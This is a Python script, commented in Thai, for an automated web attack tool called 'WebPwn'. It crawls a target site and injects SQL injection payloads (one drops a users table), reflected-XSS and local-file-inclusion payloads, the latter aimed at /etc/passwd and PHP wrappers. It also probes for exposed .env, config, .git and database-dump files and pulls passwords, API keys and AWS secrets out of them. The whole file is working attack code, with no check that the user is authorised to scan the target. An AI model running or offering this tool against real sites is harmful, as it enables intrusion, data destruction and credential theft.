#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
เครื่องมือเจาะระบบเว็บไซต์ - สำหรับการทดสอบความปลอดภัยเท่านั้น
พัฒนาโดย: palofsc
"""

import requests
import sys
import argparse
import json
import re
import time
import hashlib
import base64
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import urllib3

# ปิดการแจ้งเตือน SSL เพื่อความรวดเร็วในการทดสอบ
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# คลาสหลักสำหรับการเจาะระบบ
# =============================================================================
class WebPwn:
    def __init__(self, target_url, threads=10, timeout=10):
        self.target = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0'
        })
        self.results = {
            'sqli': [],
            'xss': [],
            'lfi': [],
            'admin_panels': [],
            'backup_files': [],
            'sensitive_files': [],
            'credentials': []
        }
        self.crawled_urls = set()
        self.forms = []

    # -------------------------------------------------------------------------
    # ฟังก์ชันช่วยเหลือ
    # -------------------------------------------------------------------------
    def _request(self, url, method='GET', data=None, headers=None, allow_redirects=True):
        """ส่งคำขอ HTTP และคืนค่าผลลัพธ์"""
        try:
            if method.upper() == 'GET':
                resp = self.session.get(url, timeout=self.timeout, headers=headers, allow_redirects=allow_redirects)
            else:
                resp = self.session.post(url, data=data, timeout=self.timeout, headers=headers, allow_redirects=allow_redirects)
            return resp
        except Exception as e:
            return None

    def _extract_forms(self, html, base_url):
        """ดึงฟอร์มทั้งหมดจาก HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            action_url = urljoin(base_url, action)
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                inp_type = inp.get('type', 'text')
                inp_name = inp.get('name', '')
                inp_value = inp.get('value', '')
                if inp_name:
                    inputs.append({'name': inp_name, 'type': inp_type, 'value': inp_value})
            forms.append({'action': action_url, 'method': method, 'inputs': inputs})
        return forms

    def _extract_links(self, html, base_url):
        """ดึงลิงก์ทั้งหมดจากหน้าเว็บ"""
        soup = BeautifulSoup(html, 'html.parser')
        links = set()
        for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
            for attr in ['href', 'src', 'action']:
                val = tag.get(attr)
                if val:
                    full_url = urljoin(base_url, val)
                    if self.target in full_url:
                        links.add(full_url.split('#')[0])
        return links

    # -------------------------------------------------------------------------
    # การสแกนหาช่องโหว่ SQL Injection
    # -------------------------------------------------------------------------
    def scan_sqli(self):
        """สแกนหาช่องโหว่ SQL Injection"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "'; DROP TABLE users;--",
            "1 AND 1=1",
            "1 AND 1=2",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        ]

        error_patterns = [
            "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
            "Warning: mysql", "unclosed quotation", "quoted string not properly terminated",
            "Microsoft OLE DB Provider", "ODBC SQL Server Driver", "SQLServer JDBC Driver",
            "java.sql.SQLException", "XPathException", "supplied argument is not a valid",
            "pg_query()", "mysql_error()", "mysqli_error()", "sqlite_query()",
            "You have an error in your SQL syntax", "supplied argument is not a valid MySQL result"
        ]

        test_urls = list(self.crawled_urls)[:50]

        def test_sqli(url):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                return

            for param in params:
                for payload in payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        for pattern in error_patterns:
                            if pattern.lower() in resp.text.lower():
                                self.results['sqli'].append({
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'error': pattern,
                                    'type': 'Error-based SQLi'
                                })
                                return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_sqli, test_urls)

    # -------------------------------------------------------------------------
    # การสแกนหาช่องโหว่ XSS
    # -------------------------------------------------------------------------
    def scan_xss(self):
        """สแกนหาช่องโหว่ Cross-Site Scripting"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:30]

        def test_xss(url):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in xss_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp and payload in resp.text:
                        self.results['xss'].append({
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Reflected XSS'
                        })
                        return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_xss, test_urls)

    # -------------------------------------------------------------------------
    # การสแกนหาไฟล์สำรองและไฟล์ที่ละเอียดอ่อน
    # -------------------------------------------------------------------------
    def scan_sensitive_files(self):
        """สแกนหาไฟล์สำรองและไฟล์ที่ละเอียดอ่อน"""
        sensitive_paths = [
            '/backup.zip', '/backup.tar.gz', '/backup.sql', '/backup.rar',
            '/www.zip', '/www.tar.gz', '/site.zip', '/site.tar.gz',
            '/.backup', '/backup/', '/backups/', '/old/', '/backup_old/',
            '/db.sql', '/database.sql', '/dump.sql', '/mysql.sql',
            '/backup.sql.gz', '/db_backup.sql', '/data.sql',
            '/.env', '/.env.local', '/.env.production', '/.env.dev',
            '/config.php', '/config.inc.php', '/configuration.php',
            '/wp-config.php', '/wp-config.php.bak', '/wp-config.php~',
            '/settings.php', '/database.php', '/db.php',
            '/config.json', '/config.xml', '/config.yaml',
            '/.htaccess', '/.htpasswd', '/web.config',
            '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
            '/.gitignore', '/.gitattributes',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/php.ini',
            '/.DS_Store', '/Thumbs.db',
            '/error.log', '/access.log', '/debug.log', '/log.txt',
            '/logs/error.log', '/logs/access.log',
            '/api/', '/swagger.json', '/swagger-ui.html',
            '/v1/', '/v2/', '/graphql', '/graphiql',
            '/README.md', '/readme.txt', '/INSTALL.txt',
            '/CHANGELOG.txt', '/LICENSE.txt',
            '/test.php', '/test/', '/testing/', '/dev/', '/staging/',
            '/adminer.php', '/phpmyadmin/', '/pma/', '/myadmin/',
            '/.well-known/', '/.svn/', '/.hg/',
        ]

        def check_file(path):
            url = self.target + path
            resp = self._request(url)
            if resp and resp.status_code == 200:
                content_length = len(resp.content)
                if content_length > 0:
                    self.results['sensitive_files'].append({
                        'url': url,
                        'status': resp.status_code,
                        'size': content_length,
                        'type': path
                    })
                    if '.env' in path or 'config' in path.lower():
                        self._extract_credentials(resp.text, url)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_file, sensitive_paths)

    # -------------------------------------------------------------------------
    # การสแกนหาหน้า Admin
    # -------------------------------------------------------------------------
    def scan_admin_panels(self):
        """สแกนหาหน้าเข้าสู่ระบบผู้ดูแล"""
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin.html',
            '/admin/login', '/admin/login.php', '/admin/index.php',
            '/adminpanel', '/admin_panel', '/admin-area',
            '/adm', '/manage', '/manager', '/management',
            '/cms', '/cms/login', '/cms/admin',
            '/wp-admin', '/wp-login.php', '/wp-login',
            '/login', '/login.php', '/login.html', '/signin',
            '/user', '/user/login', '/account/login',
            '/backend', '/backend/login', '/backoffice',
            '/control', '/control-panel', '/cpanel',
            '/dashboard', '/dashboard/login',
            '/moderator', '/moderator/login',
            '/webadmin', '/webadmin/login',
            '/panel', '/panel/login', '/admincp',
            '/admin1', '/admin2', '/admin3', '/admin4',
            '/admin5', '/admin6', '/admin7', '/admin8', '/admin9',
            '/administrator.php', '/administrator.html',
            '/administrator/index.php', '/administrator/login.php',
            '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin',
            '/mysql', '/mysqladmin', '/dbadmin',
            '/cp', '/controlpanel', '/control-panel',
            '/member', '/member/login', '/members/login',
            '/secure', '/secure/login', '/private',
            '/root', '/superuser', '/superuser/login',
        ]

        def check_admin(path):
            url = self.target + path
            resp = self._request(url, allow_redirects=False)
            if resp and resp.status_code in [200, 301, 302, 401, 403]:
                title = ''
                try:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    title = soup.title.string.strip() if soup.title else ''
                except:
                    pass

                self.results['admin_panels'].append({
                    'url': url,
                    'status': resp.status_code,
                    'title': title,
                    'size': len(resp.content)
                })

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_admin, admin_paths)

    # -------------------------------------------------------------------------
    # การสแกนหาช่องโหว่ LFI/RFI
    # -------------------------------------------------------------------------
    def scan_lfi(self):
        """สแกนหาช่องโหว่ Local File Inclusion"""
        lfi_payloads = [
            '../../../etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '....//....//....//etc/passwd',
            '....\\....\\....\\etc/passwd',
            '/etc/passwd',
            'file:///etc/passwd',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain,<?php phpinfo(); ?>',
            'expect://id',
            '../../../windows/win.ini',
            '..%2f..%2f..%2fwindows%2fwin.ini',
            'C:\\windows\\win.ini',
            'C:/windows/win.ini',
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:20]

        def test_lfi(url):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in lfi_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        if 'root:x:' in resp.text or '[extensions]' in resp.text:
                            self.results['lfi'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': resp.text[:200]
                            })
                            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_lfi, test_urls)

    # -------------------------------------------------------------------------
    # การดึงข้อมูลรหัสผ่านจากไฟล์ที่พบ
    # -------------------------------------------------------------------------
    def _extract_credentials(self, text, source_url):
        """ดึงข้อมูลรหัสผ่านจากเนื้อหา"""
        patterns = [
            r'DB_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'database_password\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'password\s*=\s*["\']?([^"\'\n]{4,})["\']?',
            r'passwd\s*=\s*["\']?([^"\'\n]{4,})["\']?',
            r'pwd\s*=\s*["\']?([^"\'\n]{4,})["\']?',
            r'AUTH_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'SECRET_KEY\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'API_KEY\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'AWS_SECRET_ACCESS_KEY\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'PRIVATE_KEY\s*=\s*["\']?([^"\'\n]+)["\']?',
            r'root:([^:\n]+):',
            r'admin:([^:\n]+):',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if len(match) > 3 and match not in ['localhost', 'utf8', 'utf8mb4', 'true', 'false', 'null']:
                    self.results['credentials'].append({
                        'source': source_url,
                        'credential': match,
                        'pattern': pattern
                    })

    # -------------------------------------------------------------------------
    # การค้นหาไฟล์สำรองฐานข้อมูล
    # -------------------------------------------------------------------------
    def scan_database_dumps(self):
        """สแกนหาไฟล์ dump ฐานข้อมูล"""
        db_extensions = ['.sql', '.sql.gz', '.sql.zip', '.sql.tar.gz', '.dump', '.backup']
        common_names = ['database', 'db', 'backup', 'dump', 'mysql', 'data', 'site', 'www']

        paths = []
        for name in common_names:
            for ext in db_extensions:
                paths.append(f'/{name}{ext}')
                paths.append(f'/{name}_backup{ext}')
                paths.append(f'/backup/{name}{ext}')
                paths.append(f'/backups/{name}{ext}')
                paths.append(f'/db/{name}{ext}')

        def check_db(path):
            url = self.target + path
            resp = self._request(url, allow_redirects=False)
            if resp and resp.status_code == 200:
                content_type = resp.headers.get('Content-Type', '')
                if 'sql' in content_type.lower() or len(resp.content) > 1000:
                    self.results['backup_files'].append({
                        'url': url,
                        'size': len(resp.content),
                        'type': 'Database Dump'
                    })

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_db, paths)

    # -------------------------------------------------------------------------
    # การ Crawl เว็บไซต์
    # -------------------------------------------------------------------------
    def crawl(self, max_depth=2, max_pages=100):
        """รวบรวม URL ทั้งหมดจากเว็บไซต์"""
        to_crawl = [(self.target, 0)]
        crawled_count = 0

        while to_crawl and crawled_count < max_pages:
            current_url, depth = to_crawl.pop(0)

            if current_url in self.crawled_urls or depth > max_depth:
                continue

            self.crawled_urls.add(current_url)
            crawled_count += 1

            resp = self._request(current_url)
            if not resp or resp.status_code != 200:
                continue

            forms = self._extract_forms(resp.text, current_url)
            self.forms.extend(forms)

            links = self._extract_links(resp.text, current_url)
            for link in links:
                if link not in self.crawled_urls:
                    to_crawl.append((link, depth + 1))

            time.sleep(0.1)

    # -------------------------------------------------------------------------
    # การรันการสแกนทั้งหมด
    # -------------------------------------------------------------------------
    def run_full_scan(self):
        """รันการสแกนทั้งหมด"""
        print(f"[+] เริ่มสแกนเป้าหมาย: {self.target}")

        print("[*] กำลัง Crawl เว็บไซต์...")
        self.crawl()
        print(f"[+] พบ {len(self.crawled_urls)} URL และ {len(self.forms)} ฟอร์ม")

        print("[*] กำลังสแกนหาไฟล์ที่ละเอียดอ่อน...")
        self.scan_sensitive_files()

        print("[*] กำลังสแกนหาหน้า Admin...")
        self.scan_admin_panels()

        print("[*] กำลังสแกนหาไฟล์สำรองฐานข้อมูล...")
        self.scan_database_dumps()

        print("[*] กำลังสแกนหาช่องโหว่ SQL Injection...")
        self.scan_sqli()

        print("[*] กำลังสแกนหาช่องโหว่ XSS...")
        self.scan_xss()

        print("[*] กำลังสแกนหาช่องโหว่ LFI...")
        self.scan_lfi()

        return self.results

    # -------------------------------------------------------------------------
    # การสร้างรายงาน
    # -------------------------------------------------------------------------
    def generate_report(self, output_file='scan_report.json'):
        """สร้างรายงานผลการสแกน"""
        report = {
            'target': self.target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'urls_crawled': len(self.crawled_urls),
                'forms_found': len(self.forms),
                'sqli_vulnerabilities': len(self.results['sqli']),
                'xss_vulnerabilities': len(self.results['xss']),
                'lfi_vulnerabilities': len(self.results['lfi']),
                'admin_panels': len(self.results['admin_panels']),
                'backup_files': len(self.results['backup_files']),
                'sensitive_files': len(self.results['sensitive_files']),
                'credentials_found': len(self.results['credentials'])
            },
            'details': self.results,
            'crawled_urls': list(self.crawled_urls),
            'forms': self.forms
        }

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n[+] รายงานถูกบันทึกที่: {output_file}")
        return report

    def print_summary(self):
        """แสดงสรุปผลการสแกน"""
        print("\n" + "="*60)
        print("สรุปผลการสแกน")
        print("="*60)

        if self.results['sensitive_files']:
            print(f"\n[!!] พบไฟล์ที่ละเอียดอ่อน: {len(self.results['sensitive_files'])} รายการ")
            for f in self.results['sensitive_files']:
                print(f"    - {f['url']} ({f['size']} bytes)")

        if self.results['admin_panels']:
            print(f"\n[!!] พบหน้า Admin: {len(self.results['admin_panels'])} รายการ")
            for a in self.results['admin_panels']:
                print(f"    - {a['url']} [Status: {a['status']}]")

        if self.results['backup_files']:
            print(f"\n[!!] พบไฟล์สำรอง: {len(self.results['backup_files'])} รายการ")
            for b in self.results['backup_files']:
                print(f"    - {b['url']} ({b['size']} bytes)")

        if self.results['credentials']:
            print(f"\n[!!!] พบข้อมูลรหัสผ่าน: {len(self.results['credentials'])} รายการ")
            for c in self.results['credentials']:
                print(f"    - แหล่งที่มา: {c['source']}")
                print(f"      ข้อมูล: {c['credential'][:50]}...")

        if self.results['sqli']:
            print(f"\n[!!] พบช่องโหว่ SQL Injection: {len(self.results['sqli'])} รายการ")
            for s in self.results['sqli']:
                print(f"    - {s['url']}")
                print(f"      พารามิเตอร์: {s['parameter']}")
                print(f"      Payload: {s['payload']}")

        if self.results['xss']:
            print(f"\n[!!] พบช่องโหว่ XSS: {len(self.results['xss'])} รายการ")
            for x in self.results['xss']:
                print(f"    - {x['url']}")
                print(f"      พารามิเตอร์: {x['parameter']}")

        if self.results['lfi']:
            print(f"\n[!!] พบช่องโหว่ LFI: {len(self.results['lfi'])} รายการ")
            for l in self.results['lfi']:
                print(f"    - {l['url']}")
                print(f"      Payload: {l['payload']}")


# =============================================================================
# ฟังก์ชันหลัก
# =============================================================================
def main():
    parser = argparse.ArgumentParser(description='เครื่องมือสแกนความปลอดภัยเว็บไซต์')
    parser.add_argument('target', help='URL เป้าหมาย (เช่น https://example.com)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='จำนวนเธรด (ค่าเริ่มต้น: 10)')
    parser.add_argument('-o', '--output', default='scan_report.json', help='ไฟล์รายงาน (ค่าเริ่มต้น: scan_report.json)')
    parser.add_argument('--timeout', type=int, default=10, help='เวลาหมดเวลา (ค่าเริ่มต้น: 10 วินาที)')

    args = parser.parse_args()

    if not args.target.startswith(('http://', 'https://')):
        print("[-] กรุณาระบุ URL ที่ถูกต้อง (ต้องขึ้นต้นด้วย http:// หรือ https://)")
        sys.exit(1)

    scanner = WebPwn(args.target, threads=args.threads, timeout=args.timeout)
    scanner.run_full_scan()
    scanner.generate_report(args.output)
    scanner.print_summary()


if __name__ == '__main__':
    main()
